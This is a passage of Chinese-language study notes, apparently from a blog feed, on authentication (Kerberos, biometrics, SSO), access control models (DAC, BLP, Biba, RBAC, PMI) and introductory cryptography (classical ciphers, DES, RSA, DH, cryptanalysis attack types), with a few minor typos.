<h2 id="密码嗅探及重放攻击防护"><a href="#密码嗅探及重放攻击防护" class="headerlink" title="密码嗅探及重放攻击防护"></a>密码嗅探及重放攻击防护</h2><ul>
<li>挑战机制<ul>
<li>客户端：请求登录</li>
<li>服务器：给出随机数作为挑战请求</li>
<li>将登录信息（用户名、密码）与随机数合并，使用单向函数（如MD5）生产字符串，作为应答返回服务器</li>
<li>服务认证后返回结果</li>
</ul>
</li>
</ul>
<h2 id="基于实体所有的鉴别"><a href="#基于实体所有的鉴别" class="headerlink" title="基于实体所有的鉴别"></a>基于实体所有的鉴别</h2><ul>
<li>采用较多的鉴别方法<ul>
<li>使用用户所持有的东西来验证用户的身份</li>
<li>用于鉴别的东西通常不容易复制</li>
</ul>
</li>
<li>鉴别物体<ul>
<li>IC卡：将微电子芯片，嵌入符合卡基，做成卡片形式的信息载体</li>
<li>内存卡</li>
<li>逻辑加密卡</li>
<li>CPU卡</li>
</ul>
</li>
<li>特点：难以复制、安全性高</li>
<li>安全威胁及防护<ul>
<li>损坏：封装应坚固耐用，承受日常使用中各种可能导致卡片损坏的行为</li>
<li>复制<ul>
<li>保证IC卡中存储和处理的各种信息不被非法访问、复制、篡改或破坏PIN码甚至其他技术实现对数据的安全防护</li>
<li>确保逻辑安全措施得到落实</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="基于实体特征的鉴别方法"><a href="#基于实体特征的鉴别方法" class="headerlink" title="基于实体特征的鉴别方法"></a>基于实体特征的鉴别方法</h2><ul>
<li>使用每个人所具有的唯一生理特征</li>
<li>如：指纹——数据采集设备——数据输入通道——数据匹配——认证结果</li>
<li>鉴别方式：指纹、手掌、静脉、视网膜、语音、面部扫描</li>
<li>鉴别系统的有效性判断<ul>
<li>错误拒绝率（FRR</li>
<li>错误接受率（FAR</li>
<li>交叉错判率（CER）：FRR=FAR的交叉点，CER用来反映系统的准确度</li>
</ul>
</li>
</ul>
<h2 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h2><ul>
<li>单一身份认证，身份信息集中管理，一次认证就可访问其授权的所有网络资源</li>
<li>实质是安全凭证在多个应用系统之间的传递或共享</li>
<li>安全优势：</li>
</ul>
<h2 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h2><ul>
<li>典型的单点登录协议</li>
<li>麻省理工开发，用于通信实体间的身份认证</li>
<li>基于对称密码算法为用户提供安全的单点登录服务</li>
<li>包含可信第三方认证服务</li>
<li>优点：<ul>
<li>避免本地保存密码会话及会话中传输密码</li>
<li>客户端和服务器可实现互认</li>
</ul>
</li>
</ul>
<h2 id="Kerberos体系构成"><a href="#Kerberos体系构成" class="headerlink" title="Kerberos体系构成"></a>Kerberos体系构成</h2><ul>
<li>运行环境构成<ul>
<li>密钥分发中心KDC<ul>
<li>系统核心，负责维护所有用户的账号信息</li>
<li>AS和TGS：AS-认证服务器，TGS-票据授权服务器</li>
</ul>
</li>
<li>应用服务器</li>
<li>客户端</li>
</ul>
</li>
<li>其他概念<ul>
<li>票据许可票据-TGT</li>
<li>服务许可票据-SGT</li>
</ul>
</li>
</ul>
<h2 id="Kerberos认证过程-三次通信"><a href="#Kerberos认证过程-三次通信" class="headerlink" title="Kerberos认证过程-三次通信"></a>Kerberos认证过程-三次通信</h2><p>认证过程由三个阶段组成，例如需要访问OA</p>
<ul>
<li>第一次：获得票据许可票据TGT</li>
<li>第二次：获得服务许可票据SGT</li>
<li>第三次：获得服务</li>
</ul>
<h2 id="Kerberos工作过程-获得TGT"><a href="#Kerberos工作过程-获得TGT" class="headerlink" title="Kerberos工作过程-获得TGT"></a>Kerberos工作过程-获得TGT</h2><ul>
<li>客户机向AS发送访问TGS请求（明文）<ul>
<li>请求信息：用户名、IP地址、时间戳、随机数</li>
<li>AS验证用户（只验证是否存在</li>
</ul>
</li>
<li>AS给予应答<ul>
<li>TGT（包含TGS会话密钥），使用KDC密码加密</li>
<li>其他信息（包含TGS会话密钥），使用用户密码加密</li>
</ul>
</li>
</ul>
<h2 id="Kerberos工作过程-获得SGT"><a href="#Kerberos工作过程-获得SGT" class="headerlink" title="Kerberos工作过程-获得SGT"></a>Kerberos工作过程-获得SGT</h2><ul>
<li>客户机向TGS发送访问应用服务请求<ul>
<li>请求信息使用TGS会话密钥加密（包含认证信息</li>
<li>包含访问应用服务名称（http</li>
</ul>
</li>
<li>TGS验证认证信息（包含用户名等）后，给予应答<ul>
<li>SGT</li>
<li>客户机与应用服务器之间的会话密钥</li>
</ul>
</li>
</ul>
<h2 id="Kerberos工作过程-获得服务"><a href="#Kerberos工作过程-获得服务" class="headerlink" title="Kerberos工作过程-获得服务"></a>Kerberos工作过程-获得服务</h2><ul>
<li>客户机向应用服务器请求服务<ul>
<li>SGT（使用http服务器密码加密</li>
<li>认证信息</li>
</ul>
</li>
<li>应用服务器（验证认证信息<ul>
<li>提供服务器验证信息（如果需要验证服务器</li>
</ul>
</li>
</ul>
<h2 id="AAA协议"><a href="#AAA协议" class="headerlink" title="AAA协议"></a>AAA协议</h2><ul>
<li>认证、授权、计费（authentication、authorization、accounting</li>
<li>常见AAA协议：radius协议、tacacs+协议、diameter协议</li>
</ul>
<h1 id="1-2-访问控制"><a href="#1-2-访问控制" class="headerlink" title="1.2-访问控制"></a>1.2-访问控制</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
<li>什么是：为用户对系统提供最大限度共享的基础上，对用户的访问进行管理，防止对信息的非授权窜改和滥用</li>
<li>作用：<ul>
<li>保证用户在系统安全策略下正常工作</li>
<li>拒绝非法用户的非授权访问请求</li>
<li>拒绝合法用户越权的服务请求</li>
</ul>
</li>
<li>访问控制模型：对一系列访问控制规则集合的描述，可以是非形式化的，也可以是形式化的</li>
<li>组成：<ul>
<li>主体</li>
<li>客体</li>
<li>访问控制实施</li>
<li>访问控制决策</li>
</ul>
</li>
<li>分类<ul>
<li>自主访问控制模型DAC<ul>
<li>访问矩阵模型<ul>
<li>访问控制列表ACL</li>
<li>权能列表 capacity list</li>
</ul>
</li>
</ul>
</li>
<li>强制访问控制模型MAC<ul>
<li>保密性模型<ul>
<li>Bell-Lapudula模型</li>
</ul>
</li>
<li>完整性模型<ul>
<li>BIba模型</li>
<li>Clark-Wilson模型</li>
</ul>
</li>
<li>混合策略模型<ul>
<li>Chinese wall模型</li>
</ul>
</li>
</ul>
</li>
<li>基于角色访问控制模型RBAC</li>
</ul>
</li>
</ul>
<h2 id="自主访问控制模型-DAC"><a href="#自主访问控制模型-DAC" class="headerlink" title="自主访问控制模型-DAC"></a>自主访问控制模型-DAC</h2><ul>
<li>何为？<ul>
<li>客体的属主（创建者）决定该客体的访问权限</li>
<li>灵活，具有较好的易用性和可拓展性</li>
<li>安全性不高</li>
</ul>
</li>
<li>实现机制：访问控制表/矩阵</li>
<li><p>实现方法：访问控制表ACL、访问能力表capacity list</p>
</li>
<li><p>访问许可</p>
<ul>
<li>描述主体对客体所具有的控制权</li>
<li>定义了改变访问模式的能力或向其他主体传送这种能力的能力</li>
</ul>
</li>
<li><p>访问模式</p>
<ul>
<li>描述主机对客体所具有的访问权</li>
<li>指明主体对客体可进行何种形式的特定访问操作：读/写/运行</li>
</ul>
</li>
<li><p>访问许可的类型</p>
<ul>
<li>等级型</li>
<li>有主型Owner：每个客体设置一个拥有者（一般是客体的生成者），拥有者是唯一有权修改客体访问控制表的主体，拥有者对其客体具有全部控制权</li>
<li>自由型Laissez-faire</li>
</ul>
</li>
<li><p>自主访问控制模型实现方式</p>
<ul>
<li>访问控制表<ul>
<li>权限与客体关联</li>
<li>在客体上附加一个主体明细表的方法来表示访问控制矩阵</li>
</ul>
</li>
<li>访问能力表<ul>
<li>权限与主体关联</li>
<li>为每个用户维护一个表，表示主体可以访问的客体及权限</li>
</ul>
</li>
</ul>
</li>
<li><p>访问控制表与访问能力表的比较</p>
<p>|              |    ACL     |     CL     |<br>| :———-: | :——–: | :——–: |<br>|   保存位置   |    客体    |    主体    |<br>| 浏览访问权限 |    容易    |    困难    |<br>| 访问权限传递 |    困难    |    容易    |<br>| 访问权限回收 |    容易    |    困难    |<br>|     使用     | 集中式系统 | 分布式系统 |</p>
</li>
<li><p>优点</p>
<ul>
<li>根据主体的身份和访问权限进行决策</li>
<li>具有某种访问能力的主体能够自主的将访问权的某个子集授予其他主体</li>
<li>灵活性高，被大量采用</li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li>安全性不高</li>
<li>信息在传递过程中其访问权限关系会被改变</li>
</ul>
</li>
</ul>
<h2 id="强制访问控制模型"><a href="#强制访问控制模型" class="headerlink" title="强制访问控制模型"></a>强制访问控制模型</h2><ul>
<li>何为？主体和客体都有一个固定的安全属性，系统用该安全属性来决定一个主体是否可以访问某个客体</li>
<li>特点<ul>
<li>安全属性是强制的，任何主体都无法变更</li>
<li>安全性较高，应用于军事等安全要求较高的系统</li>
</ul>
</li>
<li>常见的几种：BLP模型、Biba模型、Clark-Wilson模型、Chinese Wall模型</li>
</ul>
<h2 id="BLP模型"><a href="#BLP模型" class="headerlink" title="BLP模型"></a>BLP模型</h2><ul>
<li>BLP模型概念<ul>
<li>一种模拟军事安全策略的计算机访问控制模型</li>
<li>第一个严格形式化的安全模型</li>
<li>多级访问控制模型，用于保证系统信息的机密性</li>
</ul>
</li>
<li>BLP模型访问控制策略<ul>
<li>包括自主安全策略与强制安全策略</li>
<li>强制安全策略为每一个主体和客体都分配了安全级，根据安全级进行访问控制</li>
</ul>
</li>
<li>BLP模型的组成<ul>
<li>主体集：S</li>
<li>客体集：O</li>
<li>安全级：<ul>
<li>密级：绝密、机密、秘密、公开</li>
<li>范畴：军事、外交、商务</li>
</ul>
</li>
<li>安全级之间关系：密级高于或等于关系、范畴包含关系</li>
</ul>
</li>
<li>BLP模型规则<ul>
<li>机密性<ul>
<li>不上读：主体不可读，安全级别高于它的客体</li>
<li>不下写：主体不可将信息写入安全级别低于它的客体</li>
</ul>
</li>
<li>当一个高等级的主体必须与另一个低等级的主体通信，即高等级的主体写信息到低等级的客体，以便低等级的主体可以读<ul>
<li>主体有一个最高等级和一个当前安全等级，最高安全等级必须支配当前等级</li>
<li>主体可以从最高安全等级降低下来，以便与低等级的实体通信</li>
</ul>
</li>
</ul>
</li>
<li>BLP模型的关键点<ul>
<li>第一个安全策略形式化的数字模型</li>
<li>多级安全模型，强调机密性</li>
<li>访问控制机制（两个重要规则<ul>
<li>不下读：主体不可读，安全级别高于它的客体</li>
<li>不下写：主体不可将信息写入安全级别低于它的客体</li>
</ul>
</li>
<li>优点：机密性高，有效防止机密信息泄漏</li>
<li>缺点：缺乏完整性，非法窜改、破坏成为可能</li>
</ul>
</li>
</ul>
<h2 id="Biba模型"><a href="#Biba模型" class="headerlink" title="Biba模型"></a>Biba模型</h2><ul>
<li><p>概念</p>
<ul>
<li>与BLP模型数学上对偶的，完整性保护模型</li>
<li>多级访问控制模型，保护数据完整性</li>
</ul>
</li>
<li><p>访问控制策略</p>
<ul>
<li>强制安全策略为每一个主体和客体都分配了完整级，根据完整级进行访问控制</li>
</ul>
</li>
<li><p>构成</p>
<ul>
<li>完整级<ul>
<li>安全级：绝密、机密、秘密、公开</li>
<li>范畴：军事、外交、商务</li>
</ul>
</li>
<li><p>完整级存在支配关系：与BLP类似，安全级高于或等于，范畴包含</p>
</li>
<li><p>安全策略</p>
<ul>
<li>想上读：主体可以读客体，当且仅当客体的完整级别支配主体的完整级</li>
<li>向下写：主体可以写客体，当且仅当主体的完整级别支配客体的完整级</li>
</ul>
</li>
</ul>
</li>
<li><p>关键点</p>
<ul>
<li>强调完整性的访问控制策略模型</li>
<li>多级安全模型，数学上与BLP模型对偶</li>
<li>访问控制机制（两个重要规则<ul>
<li>向下写</li>
<li>向上读</li>
</ul>
</li>
<li><p>优点：完整性高、有效的防止非法篡改、破坏</p>
</li>
<li><p>缺点：机密性缺乏，无法保护机密信息泄漏</p>
</li>
</ul>
</li>
</ul>
<h2 id="Clark-Wilson模型"><a href="#Clark-Wilson模型" class="headerlink" title="Clark-Wilson模型"></a>Clark-Wilson模型</h2><ul>
<li>确保商业数据完整性的访问控制模型，侧重于满足商业应用的安全需求</li>
<li>访问控制策略：每次操作前和操作后，数据都必须满足这个一致性条件</li>
<li>目标：解决商业系统最关心的问题：系统数据的完整性以及对这些操作的完整性</li>
<li>一致性状态：数据满足给定属性，就称数据处于一个一致性状态，如<ul>
<li>今天到目前为止存入金额的总数：D</li>
<li>今天到目前为止提取金额的总数：W</li>
<li>昨天为止所有账户的金额总数：YB</li>
<li>今天到目前为止所有账户的金额总数：TB</li>
<li>一致性属性：D+YB-W=TB</li>
</ul>
</li>
<li>相关术语<ul>
<li>自由数据条目UDI</li>
<li>受限数据条目CDI</li>
<li>转换程序TP</li>
<li>完整性检查程序IVP</li>
</ul>
</li>
</ul>
<h2 id="Chinese-Wall模型"><a href="#Chinese-Wall模型" class="headerlink" title="Chinese Wall模型"></a>Chinese Wall模型</h2><ul>
<li>一种等同于考虑保密性与完整性的访问控制模型</li>
<li>主要解决商业应用中的利益冲突问题</li>
<li>在商业领域的应用与BLP模型在军事领域中的作用相当</li>
<li>公司数据集CD：与某家公司相关的若干客体</li>
<li>利益冲突COI类：若干相互竞争的公司的数据集</li>
<li>若干有竞争关系的数据集构成了利益冲突类，如<ul>
<li>银行COI类（银行a、b、c</li>
<li>石油公司COI类（公司x、y、z</li>
</ul>
</li>
</ul>
<h2 id="自主、强制访问控制的比较"><a href="#自主、强制访问控制的比较" class="headerlink" title="自主、强制访问控制的比较"></a>自主、强制访问控制的比较</h2><ul>
<li>自主<ul>
<li>细粒度</li>
<li>灵活性高</li>
<li>配置效率低</li>
</ul>
</li>
<li>强制<ul>
<li>控制粒度大</li>
<li>灵活性不高</li>
<li>安全性强</li>
</ul>
</li>
</ul>
<h2 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h2><ul>
<li>RBAC模型<ul>
<li>系统内置多个角色，将权限与角色进行关联</li>
<li>用户必须成为某个角色才能获得权限</li>
</ul>
</li>
<li>访问控制策略<ul>
<li>根据用户所担任的角色来决定用户在系统中的访问权限</li>
<li>用户必须成为某个角色，且还必须激活这一角色，才能对一个对象进行访问或执行某种操作</li>
</ul>
</li>
<li>RBAC模型四种类型<ul>
<li>RBAC0，基本模型，规定了所有RBAC的基本内容，四种要素，用户U，角色R，会话S，权限P</li>
<li>RBAC1，包含RBAC0，加入安全等级及角色继承关系</li>
<li>RBAC2，包含RBAC0，加入约束条件，例如财务和会计不能为同一人</li>
<li>RBAC3，结合了RBAC1、RBAC2</li>
</ul>
</li>
</ul>
<h2 id="基于规则的访问控制"><a href="#基于规则的访问控制" class="headerlink" title="基于规则的访问控制"></a>基于规则的访问控制</h2><ul>
<li><p>特点</p>
<ul>
<li>在RBAC模型的基础上加入规则，实现了企业安全策略的灵活动态调整</li>
</ul>
</li>
<li><p>模型类型</p>
<ul>
<li>功能级访问控制模型</li>
<li>数据集访问控制模型</li>
</ul>
</li>
</ul>
<h2 id="特权管理基础设施"><a href="#特权管理基础设施" class="headerlink" title="特权管理基础设施"></a>特权管理基础设施</h2><ul>
<li>PMI是什么<ul>
<li>与应用相关的授权服务管理</li>
<li>建立在PKI提供的可信的身份认证服务的基础</li>
<li>采用基于属性证书的授权模式</li>
</ul>
</li>
<li>PMI的主要功能<ul>
<li>对权限管理进行了系统的定义和描述</li>
<li>系统地建立起对用户身份到应用授权的映射</li>
<li>支持访问控制等应用</li>
</ul>
</li>
</ul>
<h2 id="PMI体系结构"><a href="#PMI体系结构" class="headerlink" title="PMI体系结构"></a>PMI体系结构</h2><ul>
<li>PMI是属性证书、属性权威、属性证书库等部件的集合体，用来实现权限和属性证书的产生、管理、存储、分发和撤销等功能<ul>
<li>SOA：信任源点</li>
<li>AA：签发属性证书</li>
<li>ARA：证书签发请求</li>
<li>LDAP：属性证书发布查询</li>
</ul>
</li>
<li>属性证书：以证书形式给出用户和权限的关系</li>
</ul>
<h2 id="PKI和PMI对比"><a href="#PKI和PMI对比" class="headerlink" title="PKI和PMI对比"></a>PKI和PMI对比</h2><ul>
<li>PKI<ul>
<li>你是谁？</li>
<li>身份与公钥绑定</li>
<li>身份鉴别（护照</li>
<li>RCA-CA-RA，LDAP，CRL</li>
</ul>
</li>
<li>PMI<ul>
<li>你能做什么？</li>
<li>身份（角色）与角色（属性、权限）绑定</li>
<li>授权管理（签证</li>
<li>SOA-AA-ARA，LDAP，ACRL</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>访问控制</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之密码学</title>
    <url>/2019/01/14/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<h1 id="1-1-发展历史"><a href="#1-1-发展历史" class="headerlink" title="1.1-发展历史"></a>1.1-发展历史</h1><h2 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h2><ol>
<li>古代-19世纪末：古典密码</li>
<li>20世纪初-1949：近代密码</li>
<li>1949-1975，香农论文：现代密码</li>
<li>1976后，diffie、Hellman论文（密码新方向）；公钥密码</li>
</ol>
<h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码<a id="more"></a></h2><ul>
<li>安全性在于保持算法本身的保密性，受到算法限制<ul>
<li>不适合大规模生产</li>
<li>不适合较大的或人员变动较大的组织</li>
<li>用户无法了解算法的安全性</li>
</ul>
</li>
<li>简单分类<ul>
<li>代替密码<ul>
<li>单字母代替（流密码，一个个加密<ul>
<li>单表代替密码</li>
<li>多表代替密码</li>
</ul>
</li>
<li>多字母替换（分组替换，多个一组，一组组加密</li>
</ul>
</li>
<li>换位密码（ABC到CBA，打乱顺序</li>
<li>以上两种组合</li>
</ul>
</li>
<li>举例：公元前19世纪，古埃及，特殊符号代替象形文字写碑文</li>
<li>隐写术，如藏头诗，起源古希腊战争中，头上不同符号表不同指令</li>
<li>赛塔式密码，纸条绕在棒子上</li>
<li>凯撒密码，简单替换密码，明文字母后移n位得密文</li>
<li>单表系统密码：单字母代替密码容易被破解；明文与密文的对应表不是按顺序的，是打乱的（凯撒按序）如A对Q，B对C，随意配对，只保证26个字母没重复即可；<ul>
<li>尽管相对凯撒这种按序的相对难于破解，但是无法抵御概率攻击</li>
<li>明文中字母A出现的频率与密文中字母M出现的频率是相同的，基于此原理，进行统计概率攻击</li>
</ul>
</li>
<li>多表加密系统：每个明文对应多个密文，如A对应XGV（A在第一位时取X……），B对应YHY，C对应ZIB，故明文ABC的密文为XHB；维数可以更多，越多越难破译；也有统计规律可循，但短密文不足以找到规律</li>
<li>扩散 vs 混乱思想（香农提出）<ul>
<li>扩散：将每一位明文的影响尽可能多的分布到多个密文中，以隐蔽明文的统计特性（一对多，数量多</li>
<li>混乱：使密文的统计特性与明文、密钥之间的关系尽量复杂化（结构复杂</li>
</ul>
</li>
</ul>
<h2 id="近代密码学"><a href="#近代密码学" class="headerlink" title="近代密码学"></a>近代密码学</h2><ul>
<li>标志是机械/机电密码，机电代替手工（加密的本质并没变），最著名的轮转机</li>
<li>理想的加密方案，一次一密乱码本<ul>
<li>OTP（one time pad），理论上不可破<ul>
<li>不重复使用乱码本</li>
<li>使用不可预知的随机数</li>
</ul>
</li>
<li>应用：华盛顿-莫斯科“热线”、俄罗斯间谍、CIA</li>
</ul>
</li>
</ul>
<h2 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a>现代密码学</h2><ul>
<li>新特点：安全性基于密钥而非算法的保密（从古典到近代本质并未变，机械代替手工而已</li>
</ul>
<h2 id="公钥密码学"><a href="#公钥密码学" class="headerlink" title="公钥密码学"></a>公钥密码学</h2><ul>
<li>使得发送端和接收端无密钥传输的保密通信成为可能</li>
</ul>
<h1 id="1-2-基本概念"><a href="#1-2-基本概念" class="headerlink" title="1.2-基本概念"></a>1.2-基本概念</h1><h2 id="密码学两大部分"><a href="#密码学两大部分" class="headerlink" title="密码学两大部分"></a>密码学两大部分</h2><ul>
<li>密码编码学（加密）</li>
<li>密码分析学（破解）</li>
</ul>
<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul>
<li>加密：明到密；明文通过加密算法，在密钥的作用下变成密文（联想图）；加密算法即函数，密钥即参数，明文为输入，密文为输出</li>
<li>解密：密到明；其它同上</li>
<li>根据加密密钥和解密密钥是否相同，分为对称密钥和非对称</li>
<li>有一密文，若要恢复为明文，算法和密钥缺一不可，故有两类，基于算法的和基于密钥的（古典密码基于算法，现代密码基于密钥</li>
<li>密钥空间：即密钥的比特序列长度，密钥空间越大，即密钥越长，密钥越难破解</li>
<li>现代密码学中，加密算法大部分是公开的，故确保安全的就是密钥，即此是基于密钥的（古典基于算法</li>
<li>kerchhoff假设：攻击者什么都知道，唯一不知道密钥</li>
<li>密钥管理：自产生到销毁的整个过程，如产生、存储、分发等</li>
<li>香农：提出扩散&amp;混乱；在理想密码系统中，密文的统计特性与其使用的密钥独立</li>
</ul>
<h2 id="密码分析的典型方式"><a href="#密码分析的典型方式" class="headerlink" title="密码分析的典型方式"></a>密码分析的典型方式</h2><ul>
<li>唯密文攻击：攻击者仅知道一些密文</li>
<li>已知明文攻击：攻击者知道一些明文和相应密文</li>
<li>选择明文攻击：可以选择一些明文，并得到相应的密文（中途岛海战，AF表中途岛）；攻击者有密文x而不知其明文是什么，让受害者加密a-c，发现a加密后为x，故得到密文x的明文是a；</li>
<li>选择密文攻击：可以选择一些密文，并得到相应的明文（暂时控制解密机）；攻击者掌握对解密机的访问权限，可构造任意密文对应的明文</li>
<li>旁路攻击：手机外面的信息来破解密码，而不是直接处理里面的东西，间接攻击的意思；如检测加解密过程所消耗的能量来计算过程时间；</li>
<li>重放攻击：攻击者捕获一些数据并重新提交，希望用来欺骗接受设备让其以为这是合法信息；时间戳和序列号是对付它的两种方式；</li>
<li>统计式攻击：对密文进行统计分析，得到统计规律，并与明文的统计规律进行对照，从而得到相关对应</li>
</ul>
<h2 id="密码体制分类"><a href="#密码体制分类" class="headerlink" title="密码体制分类"></a>密码体制分类</h2><ul>
<li>受限制的算法 vs 基于密钥的算法：前者基于算法，后者基于密钥</li>
<li>对称密码 vs 非对称密码：加解密的密钥是否相同，后者有公钥和私钥；前者如DES、AES，后者如RSA、ECC</li>
<li>分组密码 vs 流密码；一组组加密和一个个加密</li>
<li>代替密码 vs 置换（换位）密码：前者a替换为b，后者顺序打乱</li>
</ul>
<h2 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h2><ul>
<li>密钥的生存周期：授权使用该密钥的周期，主要有：产生、分配、使用、更新/替换、撤销、销毁<ul>
<li>拥有大量密文有助于密码分析，若一个密钥使用时间太长，会给攻击者增大收集密文的机会</li>
<li>假设一个密钥受到危及，限制密钥的使用期限就会限制安全危险的发生</li>
</ul>
</li>
<li>密钥的分配<ul>
<li>无中心的密钥分配模式：</li>
<li>中心化的分配模式：</li>
<li>公钥密码体制的分配模式（最常用）</li>
</ul>
</li>
<li>密钥管理的其他阶段<ul>
<li>密钥使用：注意内存的密钥泄漏</li>
<li>密钥存储：现更多存储在USB key中</li>
<li>密钥更新：从旧密钥中产生新密钥、公私钥重新生成</li>
<li>密钥备份：可信第三方托管或使用主密钥（公钥）加密保存；主要针对加密密钥</li>
<li>密码销毁：不同于撤销，这是物理上彻底粉碎</li>
</ul>
</li>
<li>所有的密码技术都依赖于密钥，因此很重要</li>
<li>密钥的管理本身是一个很复杂的课题，而且是保证安全性的关键点</li>
<li>密钥管理方法因所使用的密码体制（如对称和非对称）而异</li>
</ul>
<h1 id="1-3-密码学算法"><a href="#1-3-密码学算法" class="headerlink" title="1.3-密码学算法"></a>1.3-密码学算法</h1><h2 id="对称密码算法"><a href="#对称密码算法" class="headerlink" title="对称密码算法"></a>对称密码算法</h2><ul>
<li>加解密密钥相同，或者形式上不同但实质上相同</li>
<li>典型算法：DES、3DES、AES、</li>
<li>优点：效率高</li>
<li>缺点：安全交换密钥问题以及密钥管理复杂（密文可以公开传递，但密钥要通过安全信道传递给对方，安全信道怎么实现？）</li>
</ul>
<h2 id="数据加密标准DES"><a href="#数据加密标准DES" class="headerlink" title="数据加密标准DES"></a>数据加密标准DES</h2><ul>
<li>DES，一种对称密钥算法，密钥长度56b（加上奇偶校验，通常写成64b</li>
<li>采用分组加密算法，64b为一组</li>
<li>基本思想：混乱和扩散</li>
<li>使用标准的算术运算和逻辑运算</li>
<li>产生：1973年，NBS公开征集标准加密算法、IBM提出、76年发布、98年美政府不将其作为标准（因其安全性受到挑战</li>
<li>加解密过程<ul>
<li>明文，每64b作为一单位块m，对每个m操作</li>
<li>输入64b明文–初始置换—16轮迭代–交换左右32b—初始逆置换–输出64b密文（一轮迭代对应一子密钥）</li>
<li>解密过程与加密过程相似，只不过16轮迭代的子密钥顺序倒过来</li>
<li>DES逆（DES（m）） = m</li>
</ul>
</li>
<li>DES的强度<ul>
<li>密钥长度=56b（差和线不实用<ul>
<li>强力攻击：2^55次</li>
<li>差分密码分析：2的47次方</li>
<li>线性密码分析：2的43次方</li>
</ul>
</li>
<li>举例：76年-2000W美金计算机-一天、93年-100w美金计算机-3.5h、98年-EFF破译了-DES破译机（破解成本越来越低）</li>
</ul>
</li>
</ul>
<h2 id="高级数据加密标准AES"><a href="#高级数据加密标准AES" class="headerlink" title="高级数据加密标准AES"></a>高级数据加密标准AES</h2><ul>
<li>产生过程：……</li>
</ul>
<h2 id="对称密码算法的优缺点："><a href="#对称密码算法的优缺点：" class="headerlink" title="对称密码算法的优缺点："></a>对称密码算法的优缺点：</h2><ul>
<li>优点：<ul>
<li>效率高、算法简单、系统开销小</li>
<li>适合加密大量数据</li>
<li>明文长度与密文长度相等（因为使用的是算术运算和逻辑运算）</li>
</ul>
</li>
<li>缺点：<ul>
<li>需要以安全方式进行密钥交换</li>
<li>密钥管理复杂</li>
</ul>
</li>
</ul>
<h2 id="对称密码小结"><a href="#对称密码小结" class="headerlink" title="对称密码小结"></a>对称密码小结</h2><ul>
<li>DES是应用最广泛的对称密码算法（由于计算能力的快速发展，DES不再被认为是安全的</li>
<li>IDEA在欧洲应用较多</li>
<li>AES将在未来最主要、最常用的对称密码算法</li>
</ul>
<h2 id="公钥密码算法（非对称密码算法"><a href="#公钥密码算法（非对称密码算法" class="headerlink" title="公钥密码算法（非对称密码算法"></a>公钥密码算法（非对称密码算法</h2><ul>
<li>公钥、私钥</li>
<li>RSA、ECC、ElGamal、DH（Diffie与Hellman发表的第一个，以其名字命名）</li>
<li>优点：解决密钥传递问题（如DH算法）、密钥管理简单、提供数字签名等服务</li>
<li>缺：计算复杂、耗用资源多（联想对称的优缺</li>
</ul>
<h2 id="公钥密码的重要特性"><a href="#公钥密码的重要特性" class="headerlink" title="公钥密码的重要特性"></a>公钥密码的重要特性</h2><ul>
<li>加解密密钥不同</li>
<li>知道加密算法，从加密密钥得到解密密钥在计算上不可行</li>
<li>两个密钥中任何一个都可用作加密而另一个用作解密（并非绝对的公钥解密私钥加密）</li>
<li>单向陷门函数：已知x求y容易，而已知y求x困难</li>
</ul>
<h2 id="DH密钥交换"><a href="#DH密钥交换" class="headerlink" title="DH密钥交换"></a>DH密钥交换</h2><ul>
<li>DH交换及密钥产生（见算法动画图解，迪菲赫尔曼密钥交换</li>
</ul>
<h2 id="RSA公钥密码体制"><a href="#RSA公钥密码体制" class="headerlink" title="RSA公钥密码体制"></a>RSA公钥密码体制</h2><ul>
<li>三人名字命名</li>
<li>分组加密算法，0～n-1间，n为Z</li>
<li>数学基础是欧拉定理，并建立在大数分解困难性之上</li>
<li>目前应用最广泛的公钥密码算法</li>
<li>只在美国申请专利，且于00年到期</li>
</ul>
<h2 id="数字签名算法DSA"><a href="#数字签名算法DSA" class="headerlink" title="数字签名算法DSA"></a>数字签名算法DSA</h2><ul>
<li>NIST提出，并作为数字签名标准DSS，但招致大量反对<ul>
<li>DSA不能用于加密或密钥分配</li>
<li>由NSA研制，可能有后门</li>
<li>比RSA慢</li>
<li>可能侵犯其他专利</li>
<li>RSA是事实上标准（RSA也有签名功能</li>
</ul>
</li>
</ul>
<h2 id="公钥密码的应用"><a href="#公钥密码的应用" class="headerlink" title="公钥密码的应用"></a>公钥密码的应用</h2><table>
<thead>
<tr>
<th>算法</th>
<th>加解密</th>
<th>数字签名</th>
<th>密钥交换</th>
</tr>
</thead>
<tbody>
<tr>
<td>RSA</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>Dieffie-Hellman</td>
<td></td>
<td></td>
<td>是</td>
</tr>
<tr>
<td>DSS</td>
<td></td>
<td>是</td>
</tr>
</tbody>
</table>
<h2 id="公钥密码体制的优缺点"><a href="#公钥密码体制的优缺点" class="headerlink" title="公钥密码体制的优缺点"></a>公钥密码体制的优缺点</h2><ul>
<li>优点<ul>
<li>解决密钥传递问题</li>
<li>大大减少密钥持有量（对称AB、AC各有一套，而非对称中A有私，而B、C有其公，前者四个，后者三个</li>
<li>提供对称无法或很难提供的服务（如数字签名</li>
</ul>
</li>
<li>缺点<ul>
<li>计算复杂、耗用资源大</li>
<li>非堆成会导致得到的密文变长</li>
</ul>
</li>
</ul>
